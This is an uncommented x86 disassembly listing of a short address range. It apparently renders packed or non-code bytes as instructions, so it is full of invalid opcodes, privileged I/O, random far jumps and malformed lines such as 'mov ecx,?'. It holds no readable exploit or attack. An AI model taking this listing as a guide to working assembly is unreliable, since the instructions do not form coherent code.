  42379f:	sbb    dl,BYTE PTR [ebp-0x3f11293c]
  4237a5:	int    0xc8
  4237a7:	(bad)  
  4237a8:	cld    
  4237a9:	neg    BYTE PTR [edi+0x4]
  4237ac:	sti    
  4237ad:	push   ebx
  4237ae:	fld    DWORD PTR [esi-0x7c7474b2]
  4237b4:	pusha  
  4237b5:	cmc    
  4237b6:	shl    DWORD PTR [eax],1
  4237b8:	(bad)  
  4237b9:	shl    DWORD PTR [esi],cl
  4237bb:	xchg   edi,eax
  4237bc:	push   cs
  4237bd:	je     0x423821
  4237bf:	cmp    al,bh
  4237c1:	paddd  mm3,mm3
  4237c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237c5:	test   eax,0xfbd024d2
  4237ca:	cdq    
  4237cb:	loop   0x423832
  4237cd:	jecxz  0x4237ef
  4237cf:	je     0x4237ca
  4237d1:	(bad)  
  4237d2:	mov    eax,0x9efea2c8
  4237d7:	push   ds
  4237d8:	sub    edi,ebp
  4237da:	and    esp,edi
  4237dc:	and    ah,cl
  4237de:	pop    esi
  4237df:	call   0xb014:0x4aef65d0
  4237e6:	out    0x5e,eax
  4237e8:	add    esi,esp
  4237ea:	add    BYTE PTR [edx],bh
  4237ec:	push   edx
  4237ed:	les    ecx,FWORD PTR [edi]
  4237ef:	in     al,dx
  4237f0:	lahf   
  4237f1:	sti    
  4237f2:	ja     0x4237ea
  4237f4:	rcl    DWORD PTR [eax+0x69f178d3],1
  4237fa:	sar    bh,0xe0
  4237fd:	add    DWORD PTR [eax],eax
  4237ff:	out    0x1,eax
  423801:	add    BYTE PTR [eax],al
  423803:	mov    WORD PTR [edi-0x45],ds
  423806:	jb     0x423843
  423808:	sub    al,0x8d
  42380a:	or     al,0x95
  42380c:	mov    esi,0xfb51a1fc
  423811:	xchg   edi,eax
  423812:	mov    ecx,?
  423814:	nop
  423815:	mov    ecx,DWORD PTR [ecx+0x31aa6fb5]
  42381b:	jmp    0x4237e9
  42381d:	stos   BYTE PTR es:[edi],al
  42381e:	mov    esi,0xb6d231f7
  423823:	jmp    0xa25f:0x3c340d0a
  42382a:	and    cl,BYTE PTR [esi-0x62317d44]
  423830:	inc    edx
  423831:	ror    DWORD PTR ds:0x231ffa8c,cl
  423837:	arpl   WORD PTR [ebx+0x2e8751bb],si
  42383d:	in     eax,0x98
  42383f:	xchg   ecx,eax
  423840:	xchg   esp,eax
  423841:	push   0x11
  423843:	or     DWORD PTR [esi],ecx
  423845:	lea    ecx,[esi-0x5c]
  423848:	fwait
  423849:	gs xor al,0x1
  42384c:	jle    0x4238c6
  42384e:	push   es
  42384f:	stc    
  423850:	mov    eax,ds:0xa8faefb4
  423855:	clc    
  423856:	mov    bl,0x78
  423858:	mov    esi,0x42e6bc65
  42385d:	and    esp,DWORD PTR [eax+0x71d9a7a6]
  423863:	je     0x4238ba
  423865:	mov    ds:0x4d686de6,al
  42386a:	jb     0x42385a
  42386c:	shl    al,cl
  42386e:	jl     0x42389b
  423870:	pop    edx
  423871:	bound  eax,QWORD PTR ds:0x552cd291
  423877:	push   ebx
  423878:	imul   ecx,DWORD PTR [edx+ebp*1-0x75],0x9356fe63
  423880:	inc    edx
  423881:	jmp    0x8ad7:0x4b54df65
  423888:	xchg   ah,al
  42388a:	or     eax,0x62b4c838
  42388f:	sbb    DWORD PTR [edi+0x5d896b3d],0x6a1ed02c
  423899:	aaa    
  42389a:	push   esp
  42389b:	jae    0x4238a5
  42389d:	and    esi,esp
  42389f:	(bad)  
  4238a0:	xchg   ecx,eax
  4238a1:	(bad)  
  4238a2:	stos   BYTE PTR es:[edi],al
  4238a3:	cmc    
  4238a4:	mov    dh,0x56
  4238a6:	imul   edi,DWORD PTR [ebx+ebx*2],0x40
  4238aa:	mov    eax,ds:0xbcdf6014
  4238af:	and    eax,edx
  4238b1:	fimul  WORD PTR [edx+0x69ea01ba]
  4238b7:	push   0x66
  4238b9:	mov    cl,0x2
  4238bb:	cmp    BYTE PTR [edx-0x1a541465],0x59
  4238c2:	mov    ds:0x84505858,eax
  4238c7:	add    dh,bh
  4238c9:	js     0x423857
  4238cb:	adc    bh,dl
  4238cd:	pop    ebx
  4238ce:	retf   0xa850
  4238d1:	popa   
  4238d2:	stos   DWORD PTR es:[edi],eax
  4238d3:	add    al,0xb
  4238d5:	jns    0x4238e8
  4238d7:	jg     0x4238ea
  4238d9:	mov    ecx,edx
  4238db:	rol    edx,0xd2
  4238de:	shr    BYTE PTR ds:0x42bc1ac5,0xa1
  4238e5:	dec    edi
  4238e6:	aad    0x38
  4238e8:	xchg   ebx,eax
  4238e9:	ins    DWORD PTR es:[edi],dx
  4238ea:	addr16 push esi
  4238ec:	cdq    
  4238ed:	jo     0x423931
  4238ef:	dec    edi
  4238f0:	es in  al,0x36
  4238f3:	pop    ebx
  4238f4:	jp     0x4238c6
  4238f6:	(bad)  
  4238f7:	cmp    eax,0x6643117e
  4238fc:	inc    ebx
  4238fd:	xchg   ebx,eax
  4238fe:	adc    eax,0x144cbafb
  423903:	data16 in al,dx
  423905:	dec    ebp
  423906:	mov    dl,dh
  423908:	ds cli 
  42390a:	fnstsw WORD PTR [ecx]
  42390c:	or     BYTE PTR [edx-0xb4f602d],al
  423912:	push   0x36
  423914:	inc    eax
  423915:	sub    dh,BYTE PTR [esi+0x12e21ebd]
  42391b:	mov    esi,eax
  42391d:	in     al,0x8c
  42391f:	mov    esi,0x8b844cf7
  423924:	push   ecx
  423925:	and    eax,0xc7e7ae7f
  42392a:	sub    DWORD PTR [edi+0x4],edx
  42392d:	sub    bh,cl
  42392f:	call   0xd834:0xe70d9d08
  423936:	cdq    
  423937:	jns    0x42398a
  423939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42393a:	or     ebx,ebx
  42393c:	(bad)  
  42393d:	imul   ebx,DWORD PTR [ecx],0x580a7891
  423943:	aad    0x13
  423945:	call   FWORD PTR [ebp-0xd992e0]
  42394b:	jecxz  0x4239ab
  42394d:	and    edi,DWORD PTR ds:0xa92789fd
  423953:	pop    edi
  423954:	jmp    0xfc7e483c
  423959:	out    dx,al
  42395a:	ins    DWORD PTR es:[edi],dx
  42395b:	jo     0x42391c
  42395d:	retf   
  42395e:	sbb    ebx,DWORD PTR [edx+0x22dd2bd1]
  423964:	dec    edx
  423965:	retf   
  423966:	iret   
  423967:	sbb    ecx,DWORD PTR [edi-0x2]
  42396a:	mov    ds:0xb849c311,eax
  42396f:	sti    
  423970:	ret    0x79f7
  423973:	and    BYTE PTR [ebx-0x77],cl
  423976:	cmp    ebx,ebp
  423978:	repz fs aas 
  42397b:	dec    eax
  42397c:	jl     0x423900
  42397e:	pop    es
  42397f:	xchg   esp,eax
  423980:	or     eax,0x8164b757
  423985:	fistp  DWORD PTR [ecx+0x68]
  423988:	call   0xbca4:0x8bd7eec3
  42398f:	dec    ebp
  423990:	jno    0x423a11
  423992:	cmp    al,0x4b
  423994:	xor    esp,DWORD PTR [ebp-0x53]
  423997:	add    eax,0x26594476
  42399c:	pop    edi
  42399d:	mov    ecx,ebx
  42399f:	adc    BYTE PTR [ecx-0x5b17d2d8],cl
  4239a5:	icebp  
  4239a6:	ds jg  0x4239e3
  4239a9:	ror    ecx,cl
  4239ab:	lea    esp,[ecx-0xe76143b]
  4239b1:	mov    esp,0x592235c2
  4239b6:	and    al,0x21
  4239b9:	pushf  
  4239ba:	arpl   WORD PTR [ebp-0x6f],sp
  4239bd:	xchg   esi,eax
  4239be:	stos   BYTE PTR es:[edi],al
  4239bf:	sar    BYTE PTR [edi-0x20],0xef
  4239c3:	(bad)
  4239c6:	sbb    BYTE PTR [esi],cl
  4239c8:	adc    edi,DWORD PTR [eax-0x48cd7d63]
  4239ce:	out    0x37,eax
  4239d0:	pop    esp
  4239d1:	sub    DWORD PTR [edx],ecx
  4239d3:	(bad)  
  4239d4:	cmp    eax,0x79628de0
  4239d9:	sbb    BYTE PTR [esi-0x6c],dl
  4239dc:	loope  0x4239a6
  4239de:	push   ebx
  4239df:	inc    ebx
  4239e0:	adc    eax,0x80181
  4239e5:	cwde   
  4239e6:	inc    esp
  4239e7:	daa    
  4239e8:	inc    ebp
  4239e9:	or     al,BYTE PTR [eax]
  4239eb:	xchg   ebx,eax
  4239ec:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  4239f3:	push   eax
  4239f4:	loopne 0x4239f0
  4239f6:	call   0xe2e6:0x4883c41a
  4239fd:	add    DWORD PTR [eax],eax
  4239ff:	out    0x1,eax
  423a01:	add    BYTE PTR [eax],al
  423a03:	push   ebp
  423a04:	push   eax
  423a05:	out    0xcd,eax
  423a07:	sub    ah,BYTE PTR [ebp-0x62751e92]
  423a0d:	mov    ch,0x1d
  423a0f:	lods   eax,DWORD PTR ds:[esi]
  423a10:	bound  ebx,QWORD PTR [ecx+0x1dd77d80]
  423a16:	jb     0x4239ac
  423a18:	mov    edi,0x571bfb44
  423a1d:	leave  
  423a1e:	mov    edi,eax
  423a20:	mov    ds:0x878683e3,eax
  423a25:	ret    
  423a26:	pop    ebx
  423a27:	jp     0x4239fa
  423a29:	hlt    
  423a2a:	iret   
  423a2b:	sub    eax,0x449822e4
  423a30:	or     eax,0xe515606
  423a35:	xlat   BYTE PTR ds:[ebx]
  423a36:	xor    esp,ebx
  423a38:	adc    al,0x2c
  423a3a:	iret   
  423a3b:	das    
  423a3c:	(bad)  
  423a3d:	dec    ebx
  423a3e:	out    0xf9,eax
  423a40:	inc    ebx
  423a41:	xor    eax,0x958a8de2
  423a46:	ins    DWORD PTR es:[edi],dx
  423a47:	or     BYTE PTR [ebx],0x55
  423a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a4b:	or     eax,0xc38a1ffd
  423a50:	and    edi,DWORD PTR gs:[edx]
  423a53:	mov    al,0xbb
  423a55:	test   dh,bh
  423a57:	xchg   esi,eax
  423a58:	aas    
  423a59:	pushf  
  423a5a:	cmp    DWORD PTR [eax+ebp*4],edi
  423a5d:	mov    bh,0xd0
  423a5f:	(bad)  
  423a60:	rcr    ch,cl
  423a62:	xor    ah,BYTE PTR [edi+0x47]
  423a65:	jbe    0x423a8d
  423a67:	push   ss
  423a68:	popf   
  423a69:	ret    0x5d5a
  423a6c:	add    al,0x83
  423a6e:	pop    ebx
  423a6f:	fisttp QWORD PTR [eax]
  423a71:	fmul   QWORD PTR [ebx+edx*2]
  423a74:	js     0x423ac9
  423a76:	xchg   ecx,eax
  423a77:	add    eax,0x9a7403df
  423a7c:	xchg   edi,eax
  423a7d:	push   esp
  423a7e:	adc    eax,0x2286ebd6
  423a83:	pop    esi
  423a84:	cmp    BYTE PTR [ebx+0x76ec4c09],bh
  423a8a:	jns    0x423a17
  423a8c:	xchg   ecx,eax
  423a8d:	mov    esi,0x5ddd581f
  423a92:	adc    eax,0x37fb772
  423a97:	inc    ecx
  423a98:	push   0xff4f64db
  423a9d:	cmp    cl,BYTE PTR [edx-0x45]
  423aa0:	push   ss
  423aa1:	iret   
  423aa2:	ds ret 
  423aa4:	sbb    eax,0xf8f4af9
  423aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423aaa:	cs mov esp,0xcf5af10
  423ab0:	push   ecx
  423ab1:	mov    ds:0xdf495b7b,eax
  423ab6:	or     edx,DWORD PTR [edx+0x68]
  423ab9:	cwde   
  423aba:	mov    BYTE PTR [ebx+0x5e],dh
  423abd:	loop   0x423a72
  423abf:	int3   
  423ac0:	iret   
  423ac1:	cmc    
  423ac2:	lock inc esi
  423ac4:	sbb    DWORD PTR [edx+edi*8+0x57],edi
  423ac8:	inc    ebp
  423ac9:	mov    al,ds:0x6e1dbaf9
  423ace:	aas    
  423acf:	clc    
  423ad0:	test   al,0xc7
  423ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ad3:	(bad)  
  423ad4:	int3   
  423ad5:	xlat   BYTE PTR ds:[ebx]
  423ad6:	mov    bh,0xe3
  423ad8:	add    DWORD PTR [edi],edx
  423ada:	xor    eax,0x54cd5f52
  423adf:	fld    TBYTE PTR [edx-0x4679772]
  423ae5:	retf   
  423ae6:	pop    esi
  423ae7:	dec    ebp
  423ae8:	sub    eax,0x3bbd43f7
  423aed:	test   al,0xd9
  423aef:	and    DWORD PTR [edi],ecx
  423af1:	or     DWORD PTR [eax-0x725a0811],esp
  423af7:	test   BYTE PTR [edx],cl
  423af9:	xchg   ebp,eax
  423afa:	aad    0x46
  423afc:	nop
  423afd:	add    eax,0x9d28b09c
  423b02:	mov    ecx,?
  423b04:	mov    esp,0xf5a47661
  423b09:	adc    al,0xd1
  423b0b:	sahf   
  423b0c:	clc    
  423b0d:	xchg   esp,eax
  423b0e:	pop    ebx
  423b0f:	retf   
  423b10:	sub    edi,DWORD PTR [ebx]
  423b12:	es push ss
  423b14:	sahf   
  423b15:	sub    esi,DWORD PTR [ebp-0x57]
  423b18:	mov    dl,0x7c
  423b1a:	mov    WORD PTR ds:0x7fde9152,ds
  423b20:	adc    DWORD PTR [eax-0x17],esi
  423b23:	dec    esi
  423b24:	and    ebp,ebp
  423b26:	iret   
  423b27:	adc    al,0x7f
  423b29:	shl    DWORD PTR [edi-0x4a9be9bb],cl
  423b2f:	test   eax,0xfdc1dbf
  423b34:	dec    ebx
  423b35:	inc    esi
  423b36:	xor    dl,BYTE PTR [edi]
  423b38:	and    DWORD PTR [edi-0x5],eax
  423b3b:	pop    ecx
  423b3c:	add    ch,BYTE PTR [edi+eiz*2]
  423b3f:	into   
  423b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b41:	inc    ebp
  423b42:	xchg   edi,eax
  423b43:	or     ah,bh
  423b45:	mov    dl,0x73
  423b47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b48:	push   ss
  423b49:	mov    BYTE PTR ds:0x2f86eba3,dl
  423b4f:	dec    esp
  423b50:	sti    
  423b51:	enter  0x4bdd,0xd3
  423b55:	pop    edx
  423b56:	repz fistp QWORD PTR [esp+eiz*8+0x4252fc87]
  423b5e:	cmp    DWORD PTR [esi+eiz*4],ebp
  423b61:	pop    edx
  423b62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b63:	or     DWORD PTR [eax+0x481f76bb],ebx
  423b69:	adc    DWORD PTR [edx+0x14bf725c],edx
  423b6f:	xchg   esi,eax
  423b70:	mov    eax,ds:0x1396c4c5
  423b75:	lods   al,BYTE PTR ds:[esi]
  423b76:	push   es
  423b77:	add    eax,0x6522d529
  423b7c:	cmp    bl,BYTE PTR [edx-0x28]
  423b7f:	dec    edx
  423b80:	aad    0xde
  423b82:	jbe    0x423b87
  423b84:	mov    ds:0x8b8af08,eax
  423b89:	js     0x423bbf
  423b8b:	sub    esi,DWORD PTR [esi-0x2d97e7c2]
  423b91:	or     al,0xfa
  423b93:	out    0x4a,eax
  423b95:	mov    bl,0xf8
  423b97:	add    ch,BYTE PTR [edi+0x2e]
  423b9a:	pop    ebp
  423b9b:	fdivr  st(0),st
  423b9d:	and    cl,BYTE PTR [edx+0x2c]
  423ba0:	xor    esi,esi
  423ba2:	cwde   
  423ba3:	test   eax,0x3bc84290
  423ba8:	aad    0x26
  423baa:	jo     0x423bc4
  423bac:	sbb    ah,BYTE PTR [ecx-0x3c]
  423baf:	dec    ebp
  423bb0:	cmp    bl,BYTE PTR [si-0x27]
  423bb4:	mov    dl,0x69
  423bb6:	xchg   esp,eax
  423bb7:	dec    esi
  423bb8:	inc    edi
  423bb9:	mov    dl,0xc9
  423bbb:	das    
  423bbc:	mov    bh,0xcb
  423bbe:	and    eax,0xd2425431
  423bc3:	push   ebp
  423bc4:	popf   
  423bc5:	xchg   edx,eax
  423bc6:	cmp    cl,BYTE PTR [edi+ecx*1+0x12191127]
  423bcd:	test   eax,0x41a5d761
  423bd2:	mov    bh,al
  423bd4:	or     al,0x76
  423bd6:	push   ecx
  423bd7:	inc    edx
  423bd8:	adc    al,0x66
  423bda:	mov    ebx,0xdba30168
  423bdf:	mov    cs,WORD PTR [edi]
  423be1:	sub    BYTE PTR [ebx+0x1],bh
  423be4:	aad    0x54
  423be6:	in     eax,dx
  423be7:	fcomp  DWORD PTR [ebp-0x2623ff97]
  423bed:	test   eax,0xddffeef7
  423bf3:	and    al,0x1
  423bf5:	pop    ebp
  423bf6:	dec    edi
  423bf7:	cs inc ecx
  423bf9:	jecxz  0x423bf7
  423bfb:	int    0xe4
  423bfd:	add    DWORD PTR [eax],eax
  423bff:	out    0x1,eax
  423c01:	add    BYTE PTR [eax],al
  423c03:	push   edi
  423c04:	mov    edx,0x5478b63e
  423c09:	xchg   esi,eax
  423c0a:	adc    esp,DWORD PTR [eax+0x19]
  423c0d:	scas   eax,DWORD PTR es:[edi]
  423c0e:	imul   edx,DWORD PTR [eax-0x12],0xffffffc3
  423c12:	int3   
  423c13:	push   ebp
  423c14:	adc    BYTE PTR [ecx-0x34af34d1],0x5
  423c1b:	xor    eax,DWORD PTR [edx+0x20fe3325]
  423c21:	jbe    0x423c87
  423c23:	sbb    DWORD PTR [bx+di+0x51],0xffffffc4
  423c28:	call   0xd8:0x3ba7f94a
  423c2f:	pop    ebx
  423c30:	xor    al,0xed
  423c32:	jge    0x423c5f
  423c34:	das    
  423c35:	jg     0x423be4
  423c37:	and    al,0xb8
  423c39:	shl    DWORD PTR [esi+0x72],cl
  423c3c:	test   BYTE PTR [esi],al
  423c3e:	scas   eax,DWORD PTR es:[edi]
  423c3f:	pusha  
  423c40:	es (bad) 
  423c42:	fcom   DWORD PTR [esi-0x24]
  423c45:	adc    DWORD PTR [edi+eiz*8+0x25],ebp
  423c49:	test   DWORD PTR ds:0xb9c96b5e,ebp
  423c4f:	or     eax,0xafc4d986
  423c54:	cmp    dh,BYTE PTR [ebp-0x75e45e63]
  423c5a:	push   ss
  423c5b:	int3   
  423c5c:	sbb    esi,DWORD PTR gs:[esi-0x6c]
  423c60:	aam    0x9e
  423c62:	in     eax,dx
  423c63:	(bad)  
  423c64:	jmp    0xc586:0x60279145
  423c6b:	push   0x23fa9a36
  423c70:	ins    DWORD PTR es:[edi],dx
  423c71:	push   ebx
  423c72:	fisub  WORD PTR ds:0xf19f9e58
  423c78:	sbb    DWORD PTR [ebx+0x1a99825a],ebx
  423c7e:	and    al,0x72
  423c80:	call   0xc255ea12
  423c85:	adc    esi,DWORD PTR [ebx+0x1181ab27]
  423c8b:	mov    dl,0xe2
  423c8d:	mov    ds:0xd0c44d47,al
  423c92:	dec    eax
  423c93:	ins    BYTE PTR es:[edi],dx
  423c94:	fldcw  WORD PTR [eax-0x79]
  423c97:	cli    
  423c98:	pop    ecx
  423c99:	pop    ecx
  423c9a:	or     al,0x5a
  423c9c:	cmp    cl,BYTE PTR [eax+ecx*4]
  423c9f:	stc    
  423ca0:	rol    BYTE PTR [ebx],1
  423ca2:	aaa    
  423ca3:	mov    ds:0xc3bb89aa,al
  423ca8:	out    dx,al
  423ca9:	mov    edi,0xf683743f
  423cae:	mov    cl,0x23
  423cb0:	xchg   ebp,eax
  423cb1:	sub    DWORD PTR [eax-0x5f],ebp
  423cb4:	jo     0x423cf4
  423cb6:	nop
  423cb7:	loope  0x423c7d
  423cb9:	addr16 dec esp
  423cbb:	aas    
  423cbc:	shr    ah,cl
  423cbe:	cli    
  423cbf:	shl    ecx,1
  423cc1:	aad    0x42
  423cc3:	dec    ebx
  423cc4:	mov    eax,ds:0x164aa1e0
  423cc9:	add    ch,BYTE PTR [edi+ebp*8+0x35]
  423ccd:	jp     0x423cb1
  423ccf:	daa    
  423cd0:	inc    edx
  423cd1:	mov    esp,0x1cd38534
  423cd6:	hlt    
  423cd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cd8:	mov    WORD PTR [ebp-0x22],ss
  423cdb:	leave  
  423cdc:	xor    eax,0x8c4bb18f
  423ce1:	nop
  423ce2:	adc    BYTE PTR [eax],bh
  423ce4:	ret    0x3735
  423ce7:	push   ss
  423ce8:	ds test al,0x4e
  423ceb:	add    DWORD PTR [ecx-0x1b25c097],eax
  423cf1:	enter  0x1f04,0x23
  423cf5:	sbb    al,0x5f
  423cf7:	adc    eax,0xd9307f1a
  423cfc:	xchg   ebp,eax
  423cfd:	sbb    DWORD PTR [ebx-0x4e],edi
  423d00:	fidiv  DWORD PTR [esp+esi*4]
  423d04:	call   0x4c34:0x591770db
  423d0b:	pusha  
  423d0c:	adc    DWORD PTR [edx],eax
  423d0e:	lds    esp,FWORD PTR [ebx]
  423d10:	pop    ss
  423d11:	pop    edx
  423d12:	and    DWORD PTR [ebp+edi*4-0x4a],0x3e
  423d17:	leave  
  423d18:	sbb    al,0xc3
  423d1a:	xor    DWORD PTR [edi],ecx
  423d1c:	ja     0x423d97
  423d1e:	push   eax
  423d1f:	(bad)  
  423d20:	mov    bh,0xf
  423d22:	xor    al,0x3
  423d24:	dec    esp
  423d25:	sti    
  423d26:	lds    ecx,FWORD PTR [ebx-0x11a2c0dd]
  423d2c:	mov    edx,0xd64e083d
  423d31:	in     eax,dx
  423d32:	in     eax,0x46
  423d34:	mov    ah,0x6b
  423d36:	cmp    BYTE PTR [ecx+0x1088a2b1],dl
  423d3c:	sub    bl,BYTE PTR [ebp-0x60d97fd4]
  423d42:	cdq    
  423d43:	dec    esp
  423d44:	jns    0x423da7
  423d46:	leave  
  423d47:	lds    edx,FWORD PTR [edx+0x7fd03960]
  423d4d:	loop   0x423d14
  423d4f:	mov    ecx,DWORD PTR [edi+edx*2-0x7ae019f3]
  423d56:	sub    ebx,ecx
  423d58:	dec    ecx
  423d59:	fisttp DWORD PTR [esi]
  423d5b:	fidivr DWORD PTR [esi+0x2c]
  423d5e:	test   eax,0x4bbb3f8c
  423d63:	jbe    0x423d6b
  423d65:	jg     0x423d34
  423d67:	and    DWORD PTR [edx-0x76],ecx
  423d6a:	sub    eax,0xe2ad0280
  423d6f:	test   BYTE PTR [edx+0x5cf568f7],bh
  423d75:	(bad)  
  423d76:	push   esi
  423d77:	inc    edi
  423d78:	pusha  
  423d79:	mov    ecx,0xa696f193
  423d7e:	xor    esi,esp
  423d80:	ret    0xd40e
  423d83:	jp     0x423de3
  423d85:	pop    edx
  423d86:	and    BYTE PTR [ebp-0x60b25032],bh
  423d8c:	mov    edi,0x35b11910
  423d91:	inc    edx
  423d92:	(bad)  
  423d93:	aas    
  423d94:	hlt    
  423d95:	imul   ecx,DWORD PTR [ebp-0x18],0xf30ef4ed
  423d9c:	pop    edi
  423d9d:	popf   
  423d9e:	jle    0x423df7
  423da0:	push   edi
  423da1:	je     0x423d78
  423da3:	aaa    
  423da4:	inc    eax
  423da5:	pop    edi
  423da6:	xrelease xchg BYTE PTR [ebp+0x27],dh
  423daa:	sbb    BYTE PTR [ecx+0x42e79832],bl
  423db0:	xchg   ecx,eax
  423db1:	pop    edi
  423db2:	(bad)  
  423db3:	mov    dh,0xa0
  423db5:	jbe    0x423dc8
  423db7:	and    ecx,DWORD PTR [esi]
  423db9:	cs xchg ebp,eax
  423dbb:	jge    0x423e04
  423dbd:	rcr    DWORD PTR [ebx+0x6b036607],cl
  423dc3:	pushf  
  423dc4:	test   ah,ah
  423dc6:	mov    eax,0xe5fe6348
  423dcb:	or     edi,DWORD PTR [edx+ebx*2+0x21]
  423dcf:	cmp    ecx,ebp
  423dd1:	jmp    0x7ab21995
  423dd6:	xchg   ebp,eax
  423dd7:	scas   eax,DWORD PTR es:[edi]
  423dd8:	or     esp,ebx
  423dda:	ficomp DWORD PTR [edi-0x9b3e388]
  423de0:	xchg   edi,eax
  423de1:	pop    ss
  423de2:	out    dx,eax
  423de3:	push   edi
  423de4:	push   ds
  423de5:	ins    DWORD PTR es:[edi],dx
  423de6:	mov    ds:0x416f6f,al
  423deb:	outs   dx,DWORD PTR ds:[esi]
  423dec:	mov    ds:0x7edd2ad4,al
  423df1:	jmp    edi
  423df3:	push   edx
  423df4:	fcmovu st,st(5)
  423df6:	in     eax,0x57
  423df8:	push   edi
  423df9:	(bad)  
  423dfa:	jge    0x423db0
  423dfc:	out    0x1,al
  423dfe:	add    bh,ah
  423e00:	add    DWORD PTR [eax],eax
  423e02:	add    BYTE PTR [ecx+0x68],dh
  423e05:	fs inc esp
  423e07:	xlat   BYTE PTR ds:[ebx]
  423e08:	cmp    BYTE PTR [ecx+esi*2+0x49],dl
  423e0c:	and    eax,0x8d7b88a0
  423e11:	sbb    esi,DWORD PTR [edx-0x13fea7da]
  423e17:	mov    ebx,eax
  423e19:	dec    edi
  423e1a:	shr    BYTE PTR [ebx],1
  423e1c:	mov    esi,0x41c920e0
  423e21:	cmp    eax,0x821ccb1a
  423e26:	pop    ebp
  423e27:	and    DWORD PTR ss:[ebp-0x69],esp
  423e2b:	(bad)  
  423e2c:	pop    ebx
  423e2d:	push   cs
  423e2e:	outs   dx,BYTE PTR ds:[esi]
  423e2f:	pop    edx
  423e30:	mov    edi,0xb5513583
  423e35:	ret    0x72d7
  423e38:	add    ch,ah
  423e3a:	icebp  
  423e3b:	shl    BYTE PTR [ebx+0x5c6dc5e8],0x2b
  423e42:	cmp    ch,bl
  423e44:	sub    al,0x27
  423e46:	lea    esi,[ebx]
  423e48:	fwait
  423e49:	lea    ebx,[esi+edx*4-0x3b]
  423e4d:	mov    esp,0x2593afcf
  423e52:	lea    edx,[ebx]
  423e54:	cmp    al,ch
  423e56:	mov    cs,WORD PTR [edx+0x57]
  423e59:	jge    0x423e43
  423e5b:	push   ds
  423e5c:	mov    ebp,0xd605cd49
  423e61:	rcr    esi,cl
  423e63:	inc    ebp
  423e64:	mov    edi,0xaff8ff26
  423e69:	stc    
  423e6a:	inc    ebx
  423e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e6c:	iret   
  423e6d:	jmp    0x5dbe67f1
  423e72:	push   0xffffff83
  423e74:	sbb    bl,dh
  423e76:	add    al,0xb5
  423e78:	pop    edi
  423e79:	clc    
  423e7a:	cmp    cl,BYTE PTR ds:0xcd80b541
  423e80:	loop   0x423ee5
  423e82:	scas   al,BYTE PTR es:[edi]
  423e83:	loope  0x423e8e
  423e85:	and    eax,0x686a4363
  423e8a:	imul   BYTE PTR [ecx]
  423e8c:	fwait
  423e8d:	and    al,bh
  423e8f:	sbb    dl,BYTE PTR [esi]
  423e91:	scas   al,BYTE PTR es:[edi]
  423e92:	clc    
  423e93:	jp     0x423ebd
  423e95:	cmp    ebx,DWORD PTR [ecx-0xc]
  423e98:	mov    ch,0x9
  423e9a:	adc    eax,0xcaa12178
  423e9f:	xor    bl,BYTE PTR [eax]
  423ea1:	fnstsw WORD PTR [esi-0x5521ce81]
  423ea7:	sub    al,bl
  423ea9:	(bad)  
  423eab:	inc    edi
  423eac:	pop    edx
  423ead:	in     eax,0xd2
  423eaf:	loope  0x423ea5
  423eb1:	packsswb mm7,QWORD PTR [esi*8+0x204dd71d]
  423eb9:	fs retf 0x62c8
  423ebd:	and    bl,bl
  423ebf:	jne    0x423f3d
  423ec1:	mov    eax,ss
  423ec3:	add    ebp,DWORD PTR [eax+ecx*1]
  423ec6:	jge    0x423f1d
  423ec8:	mov    esi,0xeab39a61
  423ecd:	jbe    0x423eba
  423ecf:	adc    esi,DWORD PTR [eax-0x79]
  423ed2:	pusha  
  423ed3:	clc    
  423ed4:	sbb    DWORD PTR [edx+ebp*1+0x3c],eax
  423ed8:	(bad)  
  423ed9:	cs scas eax,DWORD PTR es:[edi]
  423edb:	mov    al,0xcb
  423edd:	mov    edi,0x22cf624b
  423ee2:	inc    esp
  423ee3:	pop    esp
  423ee4:	in     eax,0xed
  423ee6:	mov    ebx,0xa1e3dd47
  423eeb:	jb     0x423e92
  423eed:	push   edx
  423eee:	adc    ecx,ecx
  423ef0:	(bad)  
  423ef1:	or     al,0xa1
  423ef3:	lahf   
  423ef4:	pusha  
  423ef5:	mov    eax,0x49c2d5a2
  423efa:	call   0x2cc3553c
  423eff:	xchg   esp,eax
  423f00:	aaa    
  423f01:	or     dl,BYTE PTR [ebp-0x3fbaf18]
  423f07:	add    DWORD PTR [edx+0x39],edi
  423f0a:	jge    0x423ec3
  423f0c:	push   ss
  423f0d:	and    DWORD PTR [eax],edi
  423f0f:	icebp  
  423f10:	mov    bl,0xa5
  423f12:	imul   ebx,DWORD PTR [edx],0x3e
  423f15:	rol    BYTE PTR [esi-0x10],cl
  423f18:	or     DWORD PTR [eax-0x7],edx
  423f1b:	pop    esp
  423f1c:	cmp    al,0x5f
  423f1e:	xor    al,0xa0
  423f20:	outs   dx,BYTE PTR ds:[esi]
  423f21:	adc    ebx,DWORD PTR [edi]
  423f23:	xchg   esp,eax
  423f24:	cmp    DWORD PTR [edi-0x745cd57e],edx
  423f2a:	mov    DWORD PTR [ebx+0x68],edx
  423f2d:	sbb    al,0x2e
  423f2f:	mov    esi,0x725d2ee9
  423f34:	xor    DWORD PTR [ecx+0x62],eax
  423f37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f38:	repz in eax,0xfb
  423f3b:	test   eax,0xf00ef720
  423f40:	or     edx,DWORD PTR [ebp-0x7]
  423f43:	mov    dh,0x73
  423f45:	inc    esp
  423f46:	jb     0x423fa3
  423f48:	addr16 (bad) 
  423f4a:	shr    edx,1
  423f4c:	xor    eax,0x15f055f0
  423f51:	shl    DWORD PTR [eax+0x3],0xcb
  423f55:	icebp  
  423f56:	in     eax,dx
  423f57:	push   ss
  423f58:	inc    esi
  423f59:	pushf  
  423f5a:	mov    esi,0xfcb236e5
  423f5f:	mov    bl,0xb2
  423f61:	xchg   esp,eax
  423f62:	test   al,0x5e
  423f64:	jb     0x423f62
  423f66:	inc    eax
  423f67:	neg    DWORD PTR ds:[edx]
